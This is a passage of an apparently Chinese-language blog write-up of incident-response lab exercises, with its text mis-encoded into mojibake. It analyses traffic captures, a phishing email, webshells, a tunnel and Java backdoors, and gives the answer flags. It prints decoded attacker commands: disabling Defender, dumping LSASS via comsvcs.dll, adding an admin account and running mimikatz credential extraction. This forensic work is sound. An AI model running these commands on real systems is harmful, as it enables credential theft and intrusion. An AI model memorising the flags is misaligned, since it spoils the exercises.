<p>è¿™é‡Œå°±æ˜¯å¯ä»¥ç›´æ¥è¿‡æ»¤å‡ºæ¥httpçš„postè¯·æ±‚ï¼Œç„¶åå°±å»æ‰¾ç™»å½•çš„è´¦å·å¯†ç ï¼Œç”±äºå‰é¢çš„æ•°æ®éƒ½æ˜¯è¿›è¡Œå¯¹åº”è´¦å·çš„å¯»æ‰¾çš„ï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»åè¾¹å»å¼€å§‹æ‰¾å°±è¡Œ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/a06728ba29423f3003cccc2d949d495f--03dc--image-20240615210444170.png" alt="image-20240615210444170"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin!@#pass123&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-17"><a href="#ä»»åŠ¡äºŒ-17" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢å‘ç°çš„å…³é”®å­—ç¬¦ä¸² flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>è¯´å®è¯è¿™ä¸ªæ˜¯çœŸçš„ä¸çŸ¥é“æœ‰å•¥å¯å‘å¼æœç´¢å»æ‰¾åˆ°flag</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/c01c40d9e39dadfafbd9689ca1707e44--f411--image-20240615211323254.png" alt="image-20240615211323254"></p>
<p>æ‰¾åˆ°ä¸€ä¸ªflagï¼Œä½†å‘ç°æ˜¯é”™è¯¯çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/63bef376e0935aa8082313ce2ebed501--21c6--image-20240615211716126.png" alt="image-20240615211716126"></p>
<p>å‘ç°è¿™ä¸ªæ‰æ˜¯æ­£ç¡®çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;87b7cb79481f317bde90c116cf36084b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-17"><a href="#ä»»åŠ¡ä¸‰-17" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢æ‰¾åˆ°çš„æ•°æ®åº“å¯†ç  flag&#123;xxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯è¿‡æ»¤æœç´¢databaseå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-15/20ae209786ad80988c1e7f017fb0556b--3393--image-20240615211931634.png" alt="image-20240615211931634"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;e667jUPvJjXHvEUv&#125;</span><br></pre></td></tr></table></figure>

<h2 id="èš‚èšçˆ±ä¸Šæ ‘"><a href="#èš‚èšçˆ±ä¸Šæ ‘" class="headerlink" title="èš‚èšçˆ±ä¸Šæ ‘"></a>èš‚èšçˆ±ä¸Šæ ‘</h2><h4 id="ä»»åŠ¡ä¸€-19"><a href="#ä»»åŠ¡ä¸€-19" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç®¡ç†å‘˜Adminè´¦å·çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯æ‰“å¼€æµé‡åŒ…ï¼Œå› ä¸ºè¦æ‰¾çš„æ˜¯è´¦å·å¯†ç ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬è‚¯å®šé¦–å…ˆå°±æ˜¯æƒ³åˆ°çš„httpçš„postè¯·æ±‚åŒ…</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/cdf1ef9f9cfca2fde92b375b822afc17--3674--image-20240616195528873.png" alt="image-20240616195528873"></p>
<p>æˆ‘ä»¬å‘ç°åœ¨&#x2F;onlineshop&#x2F;product2.phpè¿™ä¸ªè·¯ç”±ä¸­postä¼ é€’äº†å¾ˆå¤šbase64åŠ å¯†åçš„æ•°æ®</p>
<p>æˆ‘ä»¬å°±ä¾æ¬¡å»åˆ†æå³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/d4495333b9913add0175063ea62f0d2a--34d3--image-20240616200019409.png" alt="image-20240616200019409"></p>
<p>å°†æ‰€æœ‰çš„æ‰¾å‡ºæ¥è§£ç å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:/phpStudy/PHPTutorial/WWW/onlineshop/database/onlineshop.sql</span><br><span class="line">cd /d â€œC:/phpStudy/PHPTutorial/WWW/onlineshopâ€&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;whoami /priv&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;systeminfo&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir c:&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net localgroup administrators&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net group â€œdomain groupâ€ /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net group â€œdomain adminsâ€ /domain&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net view&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net share&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;ls&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€Â© store.php c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir c:\temp&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;powershell -ep bypass Set-Mppreference -DisableRaltimeMonitoring $true&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;rundll32.exe comsvcs.dll, MiniDump 852 C:\temp\OnlineShopBackup.zip full&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">C:/Temp/OnlineShopBack.zip</span><br><span class="line">cd /d â€œC:/phpStudy/PHPTutorial/WWW/onlineshopâ€&amp;dir c:\windows\system32&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;dir c:\windows\config&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net localgroup administrators admin /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;whoami /all&amp;echo [S]&amp;cd&amp;echo [E]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿèƒ½å¤Ÿå¾ˆæ˜æ˜¾çš„å‘ç°è´¦å·å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;net user admin Password1 /add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Password1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-18"><a href="#ä»»åŠ¡äºŒ-18" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LSASS.exeçš„ç¨‹åºè¿›ç¨‹IDæ˜¯å¤šå°‘ï¼Ÿ</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªä¸Šé¢ä¸­ä¹ŸæŸ¥åˆ°äº†çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /d â€œC:\phpStudy\PHPTutorial\WWW\onlineshopâ€&amp;rundll32.exe comsvcs.dll, MiniDump 852</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;852&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-18"><a href="#ä»»åŠ¡ä¸‰-18" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·WIN101çš„å¯†ç æ˜¯ä»€ä¹ˆ?</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„è§£å¯†ï¼Œæˆ‘ä»¬å‘ç°æœ‰ä¸ªOnlineShopBackup.zipå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬å°†ä¹‹å¯¼å‡ºé¦–å…ˆå°±æ˜¯</p>
<p>æ‰¾åˆ°<code>47MB</code>çš„å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ<code>product2.php</code> å› ä¸ºæ˜¯èšå‰‘æµé‡æ‰€ä»¥ä¼šæœ‰å¤šä½™å­—èŠ‚ï¼Œåˆ é™¤å³å¯ã€‚å¤šä½™å­—èŠ‚ <code>e1c1709</code> åŠ è½½<code>mimiktz</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump 1.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/6003727fd148299a13936777db0630f6--4681--image-20240616201345735.png" alt="image-20240616201345735"></p>
<p>ç„¶åæ‹¿åˆ°NTLMå€¼ï¼Œç›´æ¥å°è¯•md5è§£å¯†å³å¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-16/fdd4c4e1436ec54e56d53e0a8465188e--925e--image-20240616201434726.png" alt="image-20240616201434726"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;admin#123&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬ä¸ƒç« -å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æ"><a href="#ç¬¬ä¸ƒç« -å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æ" class="headerlink" title="ç¬¬ä¸ƒç«  å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æ"></a>ç¬¬ä¸ƒç«  å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æ</h1><h2 id="é’“é±¼é‚®ä»¶"><a href="#é’“é±¼é‚®ä»¶" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h2><h4 id="ä»»åŠ¡ä¸€-20"><a href="#ä»»åŠ¡ä¸€-20" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·åˆ†æè·å–é»‘å®¢å‘é€é’“é±¼é‚®ä»¶æ—¶ä½¿ç”¨çš„IPï¼Œflagæ ¼å¼ï¼š flag&#123;11.22.33.44&#125;</span><br></pre></td></tr></table></figure>

<p>é€šå¸¸æƒ…å†µä¸‹æœ€åä¸€ä¸ªReceivedéƒ¨åˆ†å¯èƒ½ä¼šæ˜¾ç¤ºçœŸå®å‘ä»¶ipåœ°å€</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/4cae01e990d3fb1ddbd1b9696e681567--3895--image-20240621221525817.png" alt="image-20240621221525817"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;121.204.224.15&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-19"><a href="#ä»»åŠ¡äºŒ-19" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·åˆ†æè·å–é»‘å®¢é’“é±¼é‚®ä»¶ä¸­ä½¿ç”¨çš„æœ¨é©¬ç¨‹åºçš„æ§åˆ¶ç«¯IPï¼Œflagæ ¼å¼ï¼šflag&#123;11.22.33.44&#125;</span><br></pre></td></tr></table></figure>

<p>å°†base64åŠ å¯†çš„æ•°æ®è§£å¯†å¯¼å‡ºæˆzipæ–‡ä»¶ï¼Œå°±èƒ½è·å¾—å¯¹åº”çš„æ¶æ„exeæ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥å°†è¿™ä¸ªæ¶æ„æ–‡ä»¶æ‰¾ä¸€ä¸ªåœ¨çº¿æ²™ç®±ä¸¢è¿›å»ç›‘æµ‹ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/890e619c24cae5450794469cf636ecca--f1a8--image-20240621222708562.png" alt="image-20240621222708562"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;107.16.111.57&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-19"><a href="#ä»»åŠ¡ä¸‰-19" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»‘å®¢åœ¨è¢«æ§æœåŠ¡å™¨ä¸Šåˆ›å»ºäº†webshellï¼Œè¯·åˆ†æè·å–webshellçš„æ–‡ä»¶åï¼Œè¯·ä½¿ç”¨å®Œæ•´æ–‡ä»¶æ ¼å¼ï¼Œflagæ ¼å¼ï¼šflag&#123;/var/www/html/shell.php&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯å°†å¯¹åº”çš„webç›®å½•ä¸¢è¿›dç›¾ä¸­å»è¿›è¡Œæ£€æµ‹å³å¯</p>
<p>ç›´æ¥å°±æ˜¯æ‰¾åˆ°å¯¹åº”çš„åé—¨æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/www/html/admin/ebak/ReData.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-16"><a href="#ä»»åŠ¡å››-16" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag4: é»‘å®¢åœ¨è¢«æ§æœåŠ¡å™¨ä¸Šåˆ›å»ºäº†å†…ç½‘ä»£ç†éšè”½é€šä¿¡éš§é“ï¼Œè¯·åˆ†æè·å–è¯¥éš§é“ç¨‹åºçš„æ–‡ä»¶åï¼Œè¯·ä½¿ç”¨å®Œæ•´æ–‡ä»¶è·¯å¾„ï¼Œflagæ ¼å¼ï¼šflag&#123;/opt/apache2/shell&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°å°±æ˜¯è¿˜ç»™äº†ä¸ªtmpæ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬å°±æ˜¯ç›´æ¥å»æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªé‡Œé¢çš„å†…å®¹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-21/ea37a05ef4a2c929d73479183cd3c119--96a7--image-20240621223352617.png" alt="image-20240621223352617"></p>
<p>å‘ç°åˆ›å»ºäº†socksï¼Œæ‰€ä»¥å°±æ˜¯ä½¿ç”¨mysqlå»æ­å»ºå¯¹åº”çš„å†…ç½‘éš§é“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/var/tmp/proc/mysql&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬å…«ç« -å†…å­˜é©¬åˆ†æ"><a href="#ç¬¬å…«ç« -å†…å­˜é©¬åˆ†æ" class="headerlink" title="ç¬¬å…«ç«  å†…å­˜é©¬åˆ†æ"></a>ç¬¬å…«ç«  å†…å­˜é©¬åˆ†æ</h1><h2 id="java01-nacos"><a href="#java01-nacos" class="headerlink" title="java01-nacos"></a>java01-nacos</h2><h4 id="ä»»åŠ¡ä¸€-21"><a href="#ä»»åŠ¡ä¸€-21" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nacos ç”¨æˆ·å¯†ç çš„å¯†æ–‡å€¼ä½œä¸º flag æäº¤ flag&#123;å¯†æ–‡&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå°±æ˜¯æ ¹æ®é¢˜ç›®è¦æ±‚æˆ‘ä»¬å»å¯åŠ¨ &#x2F;var&#x2F;local&#x2F;ä¸‹çš„ autorun.shå³å¯æ­£å¸¸å¯</p>
<p>ç„¶åå°±å‘ç°äº†åœ¨nacosä¸­æœ‰å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å»çœ‹çœ‹æœ‰ä»€ä¹ˆé…ç½®æ–‡ä»¶ï¼Œå‘ç°mysqlçš„é…ç½®æ–‡ä»¶ï¼ŒçŒœæµ‹é‡Œé¢å¯èƒ½ä¼šæœ‰å¯†ç </p>
<p>æˆ‘ä»¬å°±ç›´æ¥å»è¯»å–ä¸€ä¸‹çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/e38bfb3b208a4321047a70ac0eab5b45--896f--image-20240702201530059.png" alt="image-20240702201530059"></p>
<p>å‘ç°å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-20"><a href="#ä»»åŠ¡äºŒ-20" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiro çš„keyä¸ºå¤šå°‘ shiro çš„ key è¯·è®°å½•ä¸‹æ¥ ï¼ˆè¯·è®°å½•ä¸‹æ¥ï¼Œä¼šæœ‰ç”¨dï¼‰</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åœ¨nacosç›®å½•ä¸‹è¿˜å‘ç°äº†ä¸€ä¸ªnacos_config_exâ€¦..zipçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¸‹è½½åˆ°æœ¬åœ°å»æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/cb1b06c2cb97d82a962ac522236996a8--066f--image-20240702201805701.png" alt="image-20240702201805701"></p>
<p>æˆåŠŸæ‰¾åˆ°key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;KduO0i+zUIMcNNJnsZwU9Q==&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-20"><a href="#ä»»åŠ¡ä¸‰-20" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¶æœºå†…æ ¸ç‰ˆæœ¬ä¸º flag&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¸Šå‘½ä»¤å°±è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -r æˆ– uname -a</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5.4.0-164-generic&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-17"><a href="#ä»»åŠ¡å››-17" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°è¯•åº”æ€¥åˆ†æï¼Œè¿è¡Œ get_flag ç„¶åå°è¯• check_flag é€šè¿‡åæäº¤ &lt;æ­¤é¢˜flagä¸æ­£ç¡®æ— æ³•ti&#x27;j&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/95d3973d099fccf698f83c3173531302--819a--image-20240702202209018.png" alt="image-20240702202209018"></p>
<p>å‘ç°æ˜¯é”™è¯¯çš„è¿™ä¸ªæ˜¯</p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹&#x2F;etc&#x2F;passwd</p>
<p>å‘ç°å­˜åœ¨ä¸¤ä¸ªuidä¸º0çš„ç”¨æˆ·ï¼ŒçŒœæµ‹åº”è¯¥æ˜¯é»‘å®¢çš„è´¦æˆ·ï¼Œæˆ‘ä»¬ä½¿ç”¨åuserdelå»åˆ é™¤ç”¨æˆ·</p>
<p>å‘ç°æ­¤ç”¨æˆ·æ­£åœ¨è¿è¡Œä¸€äº›æœåŠ¡ï¼Œæ— æ³•åˆ é™¤ã€‚<br>ç›´æ¥ä¿®æ”¹ <code>/etc/passwd</code> æ–‡ä»¶è¿›è¡Œåˆ é™¤</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-02/a0bb213fecb80dc4b959f3ef4640e16d--eb54--image-20240702202809499.png" alt="image-20240702202809499"></p>
<h4 id="ä»»åŠ¡äº”-11"><a href="#ä»»åŠ¡äº”-11" class="headerlink" title="ä»»åŠ¡äº”"></a>ä»»åŠ¡äº”</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°è¯•ä¿®å¤ nacos å¹¶ä¸”è‡ªè¡Œç”¨ poc æµ‹è¯•æ˜¯å¦æˆåŠŸ æ­¤é¢˜æ— flag</span><br></pre></td></tr></table></figure>

<p><a href="https://cn-sec.com/archives/2811865.html">https://cn-sec.com/archives/2811865.html</a>  å‚è€ƒé“¾æ¥</p>
<h2 id="java02-shiro"><a href="#java02-shiro" class="headerlink" title="java02-shiro"></a>java02-shiro</h2><h4 id="ä»»åŠ¡ä¸€-22"><a href="#ä»»åŠ¡ä¸€-22" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å°† shiro çš„ key ä½œä¸º flag æäº¤</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯ä¸Šä¸€é¢˜çš„keyå³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;KduO0i+zUIMcNNJnsZwU9Q==&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡äºŒ-21"><a href="#ä»»åŠ¡äºŒ-21" class="headerlink" title="ä»»åŠ¡äºŒ"></a>ä»»åŠ¡äºŒ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.éšè—ç”¨æˆ·ååˆ é™¤ï¼Œå¹¶å°†éšè—ç”¨æˆ·åä½œä¸º flag æäº¤</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-07-03/78539ce878dbd45ecf43263de4a20234--5278--image-20240703184656882.png" alt="image-20240703184656882"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;guest&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡ä¸‰-21"><a href="#ä»»åŠ¡ä¸‰-21" class="headerlink" title="ä»»åŠ¡ä¸‰"></a>ä»»åŠ¡ä¸‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.åˆ†æapp.jaræ–‡ä»¶æ˜¯å¦å­˜åœ¨åé—¨ï¼Œå¹¶æŠŠåé—¨è·¯ç”±åç§°ä½œä¸º flag æäº¤ &lt;flag&#123;/manager&#125;&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥å†…å­˜é©¬å»è¿æ¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªsshè´¦æˆ·å»ç™»å½•ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©åˆ›å»ºä¸€ä¸ªsshè´¦æˆ·ï¼Œåæ­£ä¸»è¦ç›®çš„å°±æ˜¯å°†app.jarä¸‹è½½ä¸‹æ¥</p>
<p>å‘ç°å…¶å¯¹åº”çš„è·¯ç”±æ˜¯&#x2F;exec</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/exec&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä»»åŠ¡å››-18"><a href="#ä»»åŠ¡å››-18" class="headerlink" title="ä»»åŠ¡å››"></a>ä»»åŠ¡å››</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.åˆ†æapp.jaræ–‡ä»¶ï¼Œå°†åé—¨çš„å¯†ç ä½œä¸º flag æäº¤</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾èƒ½å¤Ÿå‘ç°å¯†ç æ˜¯cmd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;cmd&#125;</span><br></pre></td></tr></table></figure>

<h2 id="java03-fastjson"><a href="#java03-fastjson" class="headerlink" title="java03-fastjson"></a>java03-fastjson</h2><h4 id="ä»»åŠ¡ä¸€-23"><a href="#ä»»åŠ¡ä¸€-23" class="headerlink" title="ä»»åŠ¡ä¸€"></a>ä»»åŠ¡ä¸€</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjsonç‰ˆæœ¬ä½œä¸º flag æäº¤ flag&#123;x.x.66&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥å°±æ˜¯æ‰“fastjsonå°±æ˜¯</p>
<p>ä½†æ˜¯å‘ç°å¯¹ç€pocæ‰“ä¹Ÿæ‰“ä¸é€šè¿™ä¸ª,å¯„</p>
